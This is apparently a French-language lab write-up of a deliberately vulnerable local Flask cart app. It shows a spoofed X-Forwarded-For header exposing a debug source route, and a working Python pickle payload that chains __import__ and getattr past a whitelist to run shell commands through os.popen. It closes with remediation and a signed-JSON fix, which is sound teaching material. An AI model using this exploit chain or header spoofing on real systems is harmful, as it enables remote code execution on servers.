# Analyse — désérialisation pickle non sécurisée (CWE-502)

## Résumé en une phrase

Une route de debug n'est censée répondre qu'en local, mais elle se fie à
un header que le client contrôle entièrement ; en le falsifiant, on lit
le code source de l'application, qui montre comment le panier est
stocké (`pickle`) et révèle que la protection censée l'empêcher d'être
dangereuse a un trou — on peut construire un payload qui exécute des
commandes arbitraires sur le serveur.

---

## Étape 1 — Trouver et débloquer la fuite de code source

Il n'y a aucun lien visible vers cette route, nulle part. Il faut la
trouver en testant des chemins courants (debug, source, internal...),
soit à la main, soit avec un outil de brute-force d'URL (`ffuf`,
`gobuster`, ou une simple boucle `curl` sur une wordlist).

La route est : **`/debug/source`**

```bash
curl http://localhost:5000/debug/source
```

En accès direct, ça répond **403 Interdit**. La route est censée ne
répondre qu'à `127.0.0.1` (l'idée du développeur : "c'est un outil
interne, seul le serveur lui-même doit pouvoir l'appeler"). Mais le code
détermine l'adresse du client via le header HTTP `X-Forwarded-For`
*s'il est présent*, au lieu de l'adresse réseau réelle de la connexion.
Ce header est entièrement fourni par le client : rien n'empêche de
mentir dessus.

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:5000/debug/source
```

Elle renvoie alors le fichier `app.py` complet, et seulement lui — il
n'y a pas de paramètre à cette route (pas de `?file=...`), le chemin du
fichier est écrit en dur dans le code. Impossible de s'en servir pour
lire `flag.txt` ou autre chose.

## Étape 2 — Lire et comprendre le code

En lisant `app.py`, deux choses sautent aux yeux :

**1. Le panier est stocké en `pickle`.**

```python
def save_cart(resp, items):
    payload = base64.b64encode(pickle.dumps(items)).decode()
    resp.set_cookie(COOKIE_NAME, payload, ...)
```

`pickle` est un format de sérialisation propre à Python. Son gros
problème : désérialiser (`pickle.loads`) un `pickle` qu'on ne contrôle pas
peut faire exécuter du code arbitraire. C'est documenté dans la
documentation officielle de Python elle-même.

**2. La protection censée empêcher ça a un trou.**

```python
ALLOWED_BUILTINS = {
    "list", "dict", "set", "tuple", "frozenset",
    "str", "bytes", "bytearray", "int", "float", "bool", "complex",
    "__import__", "getattr",
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "builtins" and name in ALLOWED_BUILTINS:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(...)
```

Au lieu d'un `pickle.loads()` brut, le code passe par cette classe, qui
n'autorise que quelques fonctions "de base" de Python. `eval`, `exec`,
`open` ne sont pas dans la liste : impossible de les utiliser
directement. C'est pour ça qu'un payload naïf (un objet dont le
`__reduce__` appelle `eval(...)`) ne marche pas ici.

Mais deux entrées de la liste sont dangereuses si on les combine :
`__import__` (qui importe un module, par exemple `os`) et `getattr` (qui
va chercher un attribut sur un objet, par exemple `popen` sur le module
`os`). Avec seulement ces deux-là, on peut reconstruire n'importe quel
appel Python, étape par étape.

## Étape 3 — Construire l'exploit

Le principe : `pickle` sait désérialiser des objets imbriqués. Si un
objet A contient un objet B dans ses arguments, B est reconstruit
*avant* A. On peut donc enchaîner plusieurs petits appels, chacun
utilisant le résultat du précédent :

```
1. __import__('os')                          -> le module os
2. getattr(<résultat 1>, 'popen')             -> la fonction os.popen
3. <résultat 2>('cat /flag.txt')              -> un objet "fichier ouvert"
4. getattr(<résultat 3>, 'read')              -> la méthode .read
5. <résultat 4>()                             -> le texte du flag
```

Chaque étape utilise uniquement `__import__` ou `getattr` : les deux
seules fonctions dangereuses oubliées dans la liste blanche. Le module
`os` n'est jamais nommé directement dans un endroit que `find_class()`
surveille — seulement comme un simple texte `"os"` passé en argument,
ce qui n'est pas contrôlé.

En Python, ça donne :

```python
import base64, builtins, pickle

class Chain:
    def __init__(self, func, args):
        self.func = func
        self.args = args

    def __reduce__(self):
        return (self.func, self.args)

cmd = "cat /flag.txt"
etape1 = Chain(builtins.__import__, ("os",))
etape2 = Chain(builtins.getattr, (etape1, "popen"))
etape3 = Chain(etape2, (cmd,))
etape4 = Chain(builtins.getattr, (etape3, "read"))
etape5 = Chain(etape4, ())

payload = base64.b64encode(pickle.dumps([etape5])).decode()
print(payload)
```

La liste `[etape5]` autour : l'application attend une liste en tête de
panier, et affiche tout élément qui n'est pas un dictionnaire comme un
« article mystère » — c'est là que le résultat de la commande apparaît.

## Étape 4 — Envoyer le payload

```bash
curl -b "pickle_cart=<PAYLOAD>" http://localhost:5000/cart
```

La page du panier affiche un « article mystère » dont le nom est la
sortie de la commande.

### Automatique

```bash
python3 exploit/exploit.py http://localhost:5000
python3 exploit/exploit.py http://localhost:5000 "id"      # une autre commande
```

`exploit.py` fait exactement ce qui est décrit ci-dessus.

> Le RCE est total, pas limité à `cat` : un reverse shell est possible.
> D'où l'isolation réseau obligatoire si jamais déployé ailleurs qu'en local.

## Remédiation

- Ne jamais laisser une route de debug/diagnostic accessible en
  production — elle doit être retirée ou protégée par authentification
  avant tout déploiement.
- Ne jamais faire confiance à `X-Forwarded-For` (ni à aucun header fourni
  par le client) pour une décision de sécurité : ce header n'a de sens
  que si un reverse proxy de confiance l'écrit lui-même, après avoir
  retiré toute valeur envoyée par le client. Sans ça, n'importe qui peut
  prétendre être `127.0.0.1`.
- Ne jamais désérialiser du `pickle` provenant du client, même avec une
  liste blanche : ce projet montre qu'une liste blanche basée sur des
  noms de fonctions reste fragile. Préférer un format sans exécution de
  code, comme JSON, combiné à une signature (HMAC) pour détecter toute
  modification du cookie.
- Si une liste blanche pickle est vraiment nécessaire ailleurs, l'auditer
  en particulier contre les fonctions d'introspection (`__import__`,
  `getattr`, `setattr`, `vars`, `globals`), pas seulement contre les noms
  "évidemment dangereux" (`eval`, `exec`, `os`, `subprocess`).

## Le correctif appliqué (`fixed/`)

`fixed/app.py` applique la remédiation ci-dessus : le panier n'est plus
sérialisé en `pickle` mais en JSON, et le cookie est signé avec
`itsdangerous.URLSafeSerializer` (HMAC sous le capot).

```python
serializer = URLSafeSerializer(app.secret_key, salt="cart-v1")
...
items = serializer.loads(raw)   # lève BadSignature si falsifié
```

Deux garanties, pour deux raisons différentes :

1. **JSON ne sait reconstruire que des types de données** (`dict`,
   `list`, `str`, `int`, `float`, `bool`, `None`) — jamais une classe
   Python arbitraire. Même sans aucune vérification de signature, un
   payload `pickle` envoyé à cette route échouerait simplement au
   parsing, sans jamais exécuter de code.
2. **La signature HMAC empêche en plus toute modification du cookie**
   sans connaître `SECRET_KEY` — un client ne peut donc même pas
   falsifier le *contenu* JSON (prix à 0, quantité négative, etc.).

En relançant `exploit/exploit.py` contre `http://localhost:5001`
(la version corrigée), la désérialisation échoue : il n'y a plus de
chaîne `__reduce__` à exploiter, seulement du texte JSON vérifié.
